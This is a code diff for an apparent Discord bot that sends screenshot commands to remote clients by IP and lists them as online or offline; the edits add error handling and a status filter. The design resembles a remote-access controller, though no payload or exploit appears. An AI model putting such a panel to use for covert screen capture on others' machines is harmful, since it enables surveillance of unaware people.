@@ -29,7 +29,13 @@ const handleScreenshotCommand = async (interaction) => {
     const ip = interaction.options.getString('ip');
     await interaction.deferReply({ ephemeral: true });
     axios.post(`${API_BASE_URL}/command`, { command: 'screenshot', ip: ip })
-        .then(() => interaction.editReply(`Command sent to take a screenshot on ${ip}.`))
+        .then(response => {
+            if (response.data.status === 'error') {
+                interaction.editReply(`${response.data.message}`);
+            }else{
+                interaction.editReply(`Screenshot command sent to client with **IP: ${ip}**`);
+            }
+        })
         .catch(error => {
             console.error("Error sending the command", error);
             interaction.editReply("Error sending the command.");
@@ -38,23 +44,56 @@ const handleScreenshotCommand = async (interaction) => {
 
 const handleClientsCommand = async (interaction) => {
     await interaction.deferReply({ ephemeral: true });
-    axios.get(`${API_BASE_URL}/clients`)
-        .then(response => {
-            const clients = response.data.clients;
+
+    const statusFilter = interaction.options.getString('status');
+    const url = `${API_BASE_URL}/clients${statusFilter ? `?status=${statusFilter}` : ''}`;
+
+    try {
+        const response = await axios.get(url);
+        const clients = response.data.clients;
+
+        if (clients.length === 0) {
+            await interaction.editReply("No clients available based on the selected filter.");
+            return;
+        }
+
+        if (statusFilter) {
+            const color = statusFilter === 'online' ? '#00FF00' : '#FF0000';
             const embed = new EmbedBuilder()
-                .setTitle('Clients')
-                .setDescription('Here are the available clients:')
-                .addFields(clients.map(client => ({
-                    name: client.name || 'Unnamed client',
-                    value: client.ip,
-                })))
+                .setTitle(`Clients ${statusFilter.toUpperCase()}`)
+                .setDescription(clients.map(client => `**${client.name || 'Unnamed client'}**\nIP: ${client.ip}`).join('\n\n'))
+                .setColor(color)
                 .setTimestamp();
-            interaction.editReply({embeds: [embed]});
-        })
-        .catch(error => {
-            console.error("Error retrieving clients", error);
-            interaction.editReply("Error retrieving clients.");
-        });
+
+            await interaction.editReply({ embeds: [embed] });
+        } else {
+            const onlineClients = clients.filter(client => client.status === 'online');
+            const offlineClients = clients.filter(client => client.status === 'offline');
+
+            const embeds = [];
+
+            if (onlineClients.length > 0) {
+                embeds.push(new EmbedBuilder()
+                    .setTitle('Clients ONLINE')
+                    .setDescription(onlineClients.map(client => `**${client.name || 'Unnamed client'}**\nIP: ${client.ip}`).join('\n\n'))
+                    .setColor('#00FF00')
+                    .setTimestamp());
+            }
+
+            if (offlineClients.length > 0) {
+                embeds.push(new EmbedBuilder()
+                    .setTitle('Clients OFFLINE')
+                    .setDescription(offlineClients.map(client => `**${client.name || 'Unnamed client'}**\nIP: ${client.ip}`).join('\n\n'))
+                    .setColor('#FF0000')
+                    .setTimestamp());
+            }
+
+            await interaction.editReply({ embeds: embeds });
+        }
+    } catch (error) {
+        console.error("Error retrieving clients", error);
+        await interaction.editReply("An error occurred while retrieving clients.");
+    }
 };
 
 const handleStopCommand = async (interaction) => {
